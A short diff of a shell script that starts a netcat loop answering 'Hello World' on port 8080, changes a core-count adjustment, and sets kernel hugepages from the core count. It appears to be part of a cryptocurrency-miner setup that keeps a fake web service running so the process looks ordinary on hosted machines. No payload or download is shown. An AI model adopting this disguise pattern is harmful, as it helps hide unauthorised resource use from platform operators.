@@ -27,7 +27,7 @@ name=`RandString 2 c${cores}_${addr}`;
 
 if [ "$mode" == "1" ]; then
   bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
-  [ "$cores" == "2" ] && cores="1";
+  [ "$cores" == "64" ] && cores="32";
 fi
 
 sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
